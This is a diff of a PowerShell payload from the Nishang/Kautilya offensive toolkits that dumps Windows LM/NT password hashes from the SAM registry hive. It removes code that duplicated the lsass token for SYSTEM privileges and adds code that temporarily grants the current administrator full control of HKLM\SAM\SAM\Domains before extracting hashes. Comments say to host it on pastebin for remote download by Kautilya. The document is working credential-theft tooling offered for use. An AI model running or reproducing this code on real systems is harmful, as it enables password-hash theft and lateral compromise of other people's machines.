@@ -1,137 +1,27 @@
-#Script used by Nishang payload "hashdump_powershelldown". Put this script on any web server e.g. pastebin/tinypaste and use the url in Kautilya. 
-#The script duplicates token from lsass to gain SYSTEM privs. The duplicate token code is part of Nishang (https://github.com/samratashok/nishang) and is
-#written by Niklas Goude. The hashes are dumped using the powerdump script from MSF written by David Kennedy.
+function hashdump_download { 
+<# 
+.SYNOPSIS 
+Nishang payload modified for Kautilya which dumps password hashes. 
+ 
+.DESCRIPTION 
+This is the script used by Kautilya payload "hashdump_powershelldown". Put this script on any web server or service like pastebin and use the url in Kautilya. 
+The hashes are dumped using a modified version of powerdump script from MSF written by David Kennedy.
+Administrator privileges are required for this script
+(but not SYSTEM privs as for the original powerdump)
 
-function Enable-TSDuplicateToken { 
+.EXAMPLE 
+PS > ha
+ 
+.LINK 
+http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+https://github.com/samratashok/nishang
 
-[CmdletBinding()] 
-param() 
- 
-$signature = @" 
-    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
-     public struct TokPriv1Luid 
-     { 
-         public int Count; 
-         public long Luid; 
-         public int Attr; 
-     } 
- 
-    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
-    public const int TOKEN_QUERY = 0x00000008; 
-    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
-    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
- 
-    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
-    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
-    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
-    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
-    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
-    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
-    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
-    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
-    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
-    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
-      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
-      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
-      TOKEN_ADJUST_SESSIONID); 
- 
-    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
-    public const int ANYSIZE_ARRAY = 1; 
- 
-    [StructLayout(LayoutKind.Sequential)] 
-    public struct LUID 
-    { 
-      public UInt32 LowPart; 
-      public UInt32 HighPart; 
-    } 
- 
-    [StructLayout(LayoutKind.Sequential)] 
-    public struct LUID_AND_ATTRIBUTES { 
-       public LUID Luid; 
-       public UInt32 Attributes; 
-    } 
- 
- 
-    public struct TOKEN_PRIVILEGES { 
-      public UInt32 PrivilegeCount; 
-      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
-      public LUID_AND_ATTRIBUTES [] Privileges; 
-    } 
- 
-    [DllImport("advapi32.dll", SetLastError=true)] 
-     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
-        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
- 
- 
-    [DllImport("advapi32.dll", SetLastError=true)] 
-    [return: MarshalAs(UnmanagedType.Bool)] 
-    public static extern bool SetThreadToken( 
-      IntPtr PHThread, 
-      IntPtr Token 
-    ); 
- 
-    [DllImport("advapi32.dll", SetLastError=true)] 
-     [return: MarshalAs(UnmanagedType.Bool)] 
-      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
-       UInt32 DesiredAccess, out IntPtr TokenHandle); 
- 
-    [DllImport("advapi32.dll", SetLastError = true)] 
-    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
- 
-    [DllImport("kernel32.dll", ExactSpelling = true)] 
-    public static extern IntPtr GetCurrentProcess(); 
- 
-    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
-     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
-     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
-"@ 
- 
-  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
-  if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
-    Write-Warning "Run the Command as an Administrator" 
-    Break 
-  } 
- 
-  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
-  $adjPriv = [AdjPriv.AdjPriv] 
-  [long]$luid = 0 
- 
-  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
-  $tokPriv1Luid.Count = 1 
-  $tokPriv1Luid.Luid = $luid 
-  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
- 
-  $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
-  
-  [IntPtr]$htoken = [IntPtr]::Zero 
-  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
-   
-   
-  $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
-  $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
- 
-  if(-not($retVal)) { 
-    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
-    Break 
-  } 
- 
-  $process = (Get-Process -Name lsass) 
-  [IntPtr]$hlsasstoken = [IntPtr]::Zero 
-  $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
- 
-  [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
-  $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
-  
-  $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
-  
- 
-  if(-not($retVal)) { 
-    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
-  } 
-   DumpHashes
-}
+#> 
+[CmdletBinding()]
+Param ()
 
-#######################################powerdump#########################################
+
+#######################################powerdump written by David Kennedy#########################################
 function LoadApi
 {
     $oldErrorAction = $global:ErrorActionPreference;
@@ -407,14 +297,30 @@ function Get-UserName([byte[]]$V)
 function Get-UserHashes($u, [byte[]]$hbootkey)
 {
     [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
-    if ($u.HashOffset + 0x28 -lt $u.V.Length)
+    
+    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
+    $LM_exists = $false;
+    $NT_exists = $false;
+    # LM header check
+    if ($u.V[0xa0..0xa3] -eq 20)
+    {
+        $LM_exists = $true;
+    }
+    # NT header check
+    elseif ($u.V[0xac..0xaf] -eq 20)
+    {
+        $NT_exists = $true;
+    }
+
+    if ($LM_exists -eq $true)
     {
         $lm_hash_offset = $u.HashOffset + 4;
         $nt_hash_offset = $u.HashOffset + 8 + 0x10;
         $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
         $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
     }
-    elseif ($u.HashOffset + 0x14 -lt $u.V.Length)
+	
+    elseif ($NT_exists -eq $true)
     {
         $nt_hash_offset = $u.HashOffset + 8;
         $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
@@ -476,5 +382,38 @@ function DumpHashes
     }
 }
 
-Enable-TSDuplicateToken
+    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+    {
+        Write-Warning "Script requires elevated or administrative privileges."
+        Return
+    } 
+    else
+    {
+        #Set permissions for the current user.
+        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
+        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
+        "FullControl",
+        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
+        [System.Security.AccessControl.PropagationFlags]"None",
+        [System.Security.AccessControl.AccessControlType]"Allow")
+        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+        "SAM\SAM\Domains",
+        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
+        $acl = $key.GetAccessControl()
+        $acl.SetAccessRule($rule)
+        $key.SetAccessControl($acl)
+
+        DumpHashes
+
+        #Remove the permissions added above.
+        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
+        Set-Acl HKLM:\SAM\SAM\Domains $acl
+
+    }
+}
+hashdump_download
+
 
